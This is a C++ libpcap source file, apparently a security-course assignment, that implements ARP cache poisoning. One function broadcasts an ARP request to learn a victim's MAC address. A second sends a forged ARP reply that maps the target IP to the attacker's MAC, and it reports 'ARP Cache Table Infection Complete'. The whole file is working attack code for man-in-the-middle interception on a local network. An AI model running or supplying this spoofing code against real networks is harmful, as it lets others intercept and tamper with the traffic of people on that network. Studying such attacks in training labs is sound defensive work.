#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void arp_request(const char attacker_ip[], const char attacker_mac[], char sender_mac[], char* argv[], pcap_t* handle)
{
	char temp[10];
	int i = 0;
	EthArpPacket packet;

	// Refer to gilgil mentor's codes
	// Generate ARP Request for get Sender's MAC Address
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(attacker_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	// Refer to my pcap-test Assignment
	while (true)
	{

		struct pcap_pkthdr* header;
		const u_char* packet;

		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		// Check ARP Packet
		// ARP Packet's 12~13 bytes is "08 06"
		if (packet[12] == 0x08 && packet[13] == 0x06)
		{
			// Convert Number to String and Strcpy array 'sender_mac'
			for (i = 0; i < 6; i++)
			{
				sprintf(temp, "%02x:", packet[i + 6]); // fix bug : %x => %02x
				strcpy(sender_mac + i * 3, temp);
			}
			sender_mac[17] = '\0';

			break;
		}
		// else continue
	}
	// print Sender's MAC Address
	printf("Sender MAC : %s\n", sender_mac);
}

void arp_reply(const char attacker_ip[], const char attacker_mac[], char sender_mac[], char* argv[], pcap_t* handle)
{
	char temp[10];
	int i = 0;

	// Refer to gilgil mentor's codes
	// Generate ARP Reply for ARP cache table Infection 
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac);
	// argv[3] is target IP
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(sender_mac);
	// argv[2] is sender IP
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("ARP Cache Table Infection Complete\n");
	}
}
